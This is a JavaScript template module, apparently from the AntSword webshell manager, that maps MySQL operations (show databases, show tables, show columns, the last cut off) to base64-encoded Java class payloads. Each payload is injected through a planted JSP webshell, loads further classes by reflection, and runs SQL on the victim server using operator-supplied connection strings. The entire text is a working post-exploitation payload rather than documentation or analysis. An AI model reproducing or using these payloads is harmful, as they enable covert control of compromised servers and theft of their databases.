//
// 默认代码模板
//
// @params
// :encode  SHELL编码
// :conn    数据库连接字符串
// :sql     执行SQL语句
// :db      数据库名
// :table   表名

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  show_databases: {
    _: 'yv66vgAAADEBLQoACQB+CQBiAH8JAGIAgAgAgQoABwCCCACDBwCECgAHAIUHAIYKAIcAiAcAiQgAigcAiwcAjAoACQCNCABjCgAHAI4KAI8AkAoAjwCRCABlCACSCQBiAJMIAJQJAGIAlQgAlgkAYgCXBwCYCACZCgAbAJoIAJsIAJwIAJ0IAJ4IAJ8IAKALAA0AoQsACwCiCwANAKILAAsAowoAYgCkCQBiAKUKAGIApgoAGwCnBwCoCgAsAH4IAKkKACwAqgoADgCrCgAsAKsLAA0ArAoAGwCrCgBiAK0KAK4ArwoAsACxCgA5ALIKADkAswcAtAoAYgC1CgA5ALYKADkAtwgAuAgAuQoAOQC6CgA5ALsIALwKAL0AvgsAvwDACwDBAMILAMMAxAsAxQDGCwDFAMcLAMMAyAsAwwDJCADKCADLCgBiAMwHAM0IAM4HAM8JALAA0AoAhwCQCgAHANEKALAA0goABwDTCgDUANUKAAkAqwgA1goA1wDYCADZCgA5ANoIANsIANwKAAcA3QgAcggA3ggA3woABwDgBwDhAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEADXNob3dEYXRhYmFzZXMBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABNTaG93X2RhdGFiYXNlcy5qYXZhDABsAG0MAGMAZAwAZQBmAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAOIA4wEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAOQA5QEAEGphdmEvbGFuZy9PYmplY3QHAOYMAOcA6AEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAtnZXRSZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA6QDqDADrAOwHAO0MAO4A7wwA8ADxAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAGoAaAEABmJhc2U2NAwAZwBoAQAPYW50c3dvcmRDaGFyc2V0DABpAGgBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABsAPIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEAEmFudHN3b3JkYXJnZGVjb2RlcgEACXRleHQvaHRtbAwA8wDyDAD0APIMAPUAcwwAcgBzDABrAGgMAHcAeAwA9gD3AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAlFUlJPUjovLyAMAPYA+AwA+QD6DAD7APwMAHkAcwcA/QwA/gDyBwD/DAEAAQEMAQIBAwwAcABxAQAQamF2YS9sYW5nL1N0cmluZwwAegB7DABsAQQMAQUA+gEAAg0KAQABCgwBBgEHDAEIAQkBABMmY2hhcmFjdGVyRW5jb2Rpbmc9BwEKDAELAQwHAQ0MAQ4BDwcBEAwBEQESBwETDAEUARUHARYMARcBGAwBGQEDDAEaARsMARwBAwEADnNob3cgZGF0YWJhc2VzAQABCQwAdQB2AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBHQEeDAEfASAMASEBIgwBIwEkBwElDAEmAScBAAxqYXZhLnZlcnNpb24HASgMASkAcwEAAzEuOQwBKgEBAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMASsA5QEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMASYBLAEAHWRhdGFiYXNlL215c3FsL1Nob3dfZGF0YWJhc2VzAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEdHJpbQEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAWamF2YS9zcWwvRHJpdmVyTWFuYWdlcgEADWdldENvbm5lY3Rpb24BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9Db25uZWN0aW9uOwEAE2phdmEvc3FsL0Nvbm5lY3Rpb24BAA9jcmVhdGVTdGF0ZW1lbnQBABYoKUxqYXZhL3NxbC9TdGF0ZW1lbnQ7AQASamF2YS9zcWwvU3RhdGVtZW50AQAMZXhlY3V0ZVF1ZXJ5AQAoKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvUmVzdWx0U2V0OwEAEmphdmEvc3FsL1Jlc3VsdFNldAEAC2dldE1ldGFEYXRhAQAeKClMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7AQAaamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGEBAA5nZXRDb2x1bW5Db3VudAEAAygpSQEADWdldENvbHVtbk5hbWUBAARuZXh0AQADKClaAQAJZ2V0U3RyaW5nAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwAhAGIACQAAAAYAAQBjAGQAAAABAGUAZgAAAAEAZwBoAAAAAQBpAGgAAAABAGoAaAAAAAEAawBoAAAABwABAGwAbQABAG4AAAAvAAIAAQAAAA8qtwABKgG1AAIqAbUAA7EAAAABAG8AAAAOAAMAAAAMAAQADQAJAA4AAQBwAHEAAQBuAAACegAEAAoAAAGaEgS4AAVNKiwSBgO9AAe2AAgrA70ACbYACsAAC7UAAiosEgwDvQAHtgAIKwO9AAm2AArAAA21AAOnAHpNK8EAC5kAciorwAALtQACKrQAArYADxIQtgARTi0EtgASLSq0AAK2ABPAAAs6BBkEtgAPEhS2ABE6BRkFBLYAEioZBRkEtgATwAANtQADpwAoTioqtAACtgAPEgwDvQAHtgAIKwO9AAm2AArAAA21AAOnAAU6BCoSFbUAFioSF7UAGCoSGbUAGrsAG1kSHLcAHU0SHk4SHzoEEiA6BRIhOgYSIjoHKrQAAxIjuQAkAgAqtAACKrQAGrkAJQIAKrQAAyq0ABq5ACYCACoqtAACGQW5ACcCALYAKDoIKiq0AAIZBrkAJwIAtgAoOgkqKiq0AAIZB7kAJwIAtgAotQApLCoZCBkJtgAqtgArV6cAIToILLsALFm3AC0SLrYALxkItgAwtgAvtgAxtgArVyq0AAO5ADIBALsALFm3AC0ttgAvKiy2ADO2ADS2AC8ZBLYAL7YAMbYANacABToIBKwABQAAADgAOwAOAEsAigCNAA4AjgCtALAADgDhAUgBSwAOAWkBkwGWAA4AAQBvAAAApgApAAAAFwAGABgAHwAZADgALAA7ABoAPAAbAEMAHABLAB4AWAAfAF0AIABqACEAdgAiAHwAIwCKACoAjQAkAI4AJgCtACkAsAAnALIALQC4AC4AvgAvAMQAMADOADEA0QAyANUAMwDZADQA3QA1AOEANwDsADgA+QA5AQYAOgEXADsBKAA8ATsAPQFIAEABSwA+AU0APwFpAEIBkwBEAZYAQwGYAEUAAAByAHMAAgBuAAAAdQAEAAQAAAA1Az0qtAAWuAA2PSsctgA3TKcABk4DPSq0ABgSF7YAOJkAFLsAOVkqK7YAOiq0ABq3ADuwK7AAAQACABAAEwAOAAEAbwAAACYACQAAAEkAAgBLAAoATAAQAE8AEwBNABQATgAWAFAAIgBRADMAUwB0AAAABAABAA4AAAB1AHYAAgBuAAABgwADABAAAAEXEhw6Byy2ADwSPRI+tgA/Ej62AEA6CBkIAzK2ADy4AAVXuwAsWbcALRkIBDK2AC8SQbYALyu2AC+2ADE6CRkJuABCOgoZCrkAQwEAOgsZCy25AEQCADoMGQy5AEUBADoNFQaZAFQENg4VDhkNuQBGAQCjAC8ZDRUOuQBHAgA6D7sALFm3AC0ZB7YALxkPtgAvGQS2AC+2ADE6B4QOAaf/y7sALFm3AC0ZB7YALxkFtgAvtgAxOgcZDLkASAEAmQBXBDYOFQ4ZDbkARgEAowAvGQwVDrkASQIAOg+7ACxZtwAtGQe2AC8ZD7YALxkEtgAvtgAxOgeEDgGn/8u7ACxZtwAtGQe2AC8ZBbYAL7YAMToHp/+lGQewAAAAAQBvAAAAWgAWAAAAWAAEAFkAFgBaACEAWwA9AFwARABdAE0AXgBXAF8AYABhAGUAYgB0AGMAfwBkAJoAYgCgAGYAtgBpAMAAagDPAGsA2gBsAPUAagD7AG4BEQBvARQAcAB0AAAABAABAA4AAAB3AHgAAgBuAAAAPAAHAAYAAAAYEkpOEks6BBIcOgUqKywtGQQZBQO2AEywAAAAAQBvAAAAEgAEAAAAdAADAHUABwB2AAsAdwB0AAAABAABAA4AAQB5AHMAAQBuAAAArQAGAAUAAAB1Kiq0ACm2ADpNEwBNEk4GvQAHWQMTAE9TWQSyAFBTWQWyAFBTtgAITi0EtgBRLSq2AA+2AFIGvQAJWQMsU1kEA7gAU1NZBSy+uABTU7YACsAABzoEGQQEvQAHWQMTADlTtgBUBL0ACVkDK1O2AFW2AFawTSuwAAEAAABxAHIADgABAG8AAAAeAAcAAAB8AAkAfQAoAH4ALQB/AFQAgAByAIEAcwCCAAEAegB7AAEAbgAAANsABgAGAAAAjwFNEle4AFhOLRJZtgBamwBKElu4AAU6BBkEElwDvQAHtgBdAQO9AAm2AAo6BRkFtgAPEl4EvQAHWQMTADlTtgBdGQUEvQAJWQMrU7YACsAAT8AAT02nADISX7gABToEGQQSYAS9AAdZAxMAOVO2AF0ZBLYAYQS9AAlZAytTtgAKwABPwABPTSywOgQDvAiwAAEACACIAIkADgABAG8AAAAyAAwAAACHAAIAiAAIAIoAEQCLABgAjAAtAI0AVQCOAFgAjwBfAJAAhwCSAIkAkwCLAJQAAQB8AAAAAgB9',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}'
  },
  show_tables: {
    _: 'yv66vgAAADEBLwoACQB/CQBjAIAJAGMAgQgAggoABwCDCACEBwCFCgAHAIYHAIcKAIgAiQcAiggAiwcAjAcAjQoACQCOCABkCgAHAI8KAJAAkQoAkACSCABmCACTCQBjAJQIAJUJAGMAlggAlwkAYwCYBwCZCACaCgAbAJsIAJwIAJ0IAJ4IAJ8IAKAIAKEIAKILAA0AowsACwCkCwANAKQLAAsApQoAYwCmCQBjAKcKAGMAqAoAGwCpBwCqCgAtAH8IAKsKAC0ArAoADgCtCgAtAK0LAA0ArgoAGwCtCgBjAK8KALAAsQoAsgCzCgA6ALQKADoAtQcAtgoAYwC3CgA6ALgKADoAuQgAuggAuwoAOgC8CgA6AL0IAL4KAL8AwAsAwQDCCwDDAMQLAMUAxgsAxwDICwDHAMkLAMUAygsAxQDLCADMCADNCgBjAM4HAM8IANAHANEJALIA0goAiACRCgAHANMKALIA1AoABwDVCgDWANcKAAkArQgA2AoA2QDaCADbCgA6ANwIAN0IAN4KAAcA3wgAcwgA4AgA4QoABwDiBwDjAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEACnNob3dUYWJsZXMBAEooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABBTaG93X3RhYmxlcy5qYXZhDABtAG4MAGQAZQwAZgBnAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAOQA5QEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAOYA5wEAEGphdmEvbGFuZy9PYmplY3QHAOgMAOkA6gEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAtnZXRSZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA6wDsDADtAO4HAO8MAPAA8QwA8gDzAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAGsAaQEABmJhc2U2NAwAaABpAQAPYW50c3dvcmRDaGFyc2V0DABqAGkBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABtAPQBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADWFudHN3b3JkYXJnZGIBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAPUA9AwA9gD0DAD3AHQMAHMAdAwAbABpDAB4AHkMAPgA+QEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDAD4APoMAPsA/AwA/QD+DAB6AHQHAP8MAQAA9AcBAQwBAgEDDAEEAQUMAHEAcgEAEGphdmEvbGFuZy9TdHJpbmcMAHsAfAwAbQEGDAEHAPwBAAINCgEAAQoMAQgBCQwBCgELAQATJmNoYXJhY3RlckVuY29kaW5nPQcBDAwBDQEOBwEPDAEQAREHARIMARMBFAcBFQwBFgEXBwEYDAEZARoMARsBBQwBHAEdDAEeAQUBABFzaG93IHRhYmxlcyBmcm9tIAEAAQkMAHYAdwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQACW0IMAR8BIAwBIQEiDAEjASQMASUBJgcBJwwBKAEpAQAMamF2YS52ZXJzaW9uBwEqDAErAHQBAAMxLjkMASwBAwEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyDAEtAOcBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAEoAS4BABpkYXRhYmFzZS9teXNxbC9TaG93X3RhYmxlcwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABHRyaW0BAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAFmphdmEvc3FsL0RyaXZlck1hbmFnZXIBAA1nZXRDb25uZWN0aW9uAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvQ29ubmVjdGlvbjsBABNqYXZhL3NxbC9Db25uZWN0aW9uAQAPY3JlYXRlU3RhdGVtZW50AQAWKClMamF2YS9zcWwvU3RhdGVtZW50OwEAEmphdmEvc3FsL1N0YXRlbWVudAEADGV4ZWN1dGVRdWVyeQEAKChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL1Jlc3VsdFNldDsBABJqYXZhL3NxbC9SZXN1bHRTZXQBAAtnZXRNZXRhRGF0YQEAHigpTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhOwEAGmphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhAQAOZ2V0Q29sdW1uQ291bnQBAAMoKUkBAA1nZXRDb2x1bW5OYW1lAQAEbmV4dAEAAygpWgEACWdldFN0cmluZwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEv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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::db}'
  },
  show_columns: {
    _: 'yv66vgAAADEBNQoACQCCCQBmAIMJAGYAhAgAhQoABwCGCACHBwCICgAHAIkHAIoKAIsAjAcAjQgAjgcAjwcAkAoACQCRCABnCgAHAJIKAJMAlAoAkwCVCABpCACWCQBmAJcIAJgJAGYAmQgAmgkAZgCbBwCcCACdCgAbAJ4IAJ8IAKAIAKEIAKIIAKMIAKQIAKUIAKYLAA0ApwsACwCoCwANAKgLAAsAqQoAZgCqCQBmAKsKAGYArAoAGwCtBwCuCgAuAIIIAK8KAC4AsAoADgCxCgAuALELAA0AsgoAGwCxCgBmALMKALQAtQoAtgC3CgA7ALgKADsAuQcAugoAZgC7CgA7ALwKADsAvQgAvggAvwoAOwDACgA7AMEIAMIKAMMAxAsAxQDGCwDHAMgLAMkAygsAywDMCwDLAM0LAMkAzgsAyQDPCADQCADRCADSCADTCgBmANQHANUIANYHANcJALYA2AoAiwCUCgAHANkKALYA2goABwDbCgDcAN0KAAkAsQgA3goA3wDgCADhCgA7AOIIAOMIAOQKAAcA5QgAdggA5ggA5woABwDoBwDpAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN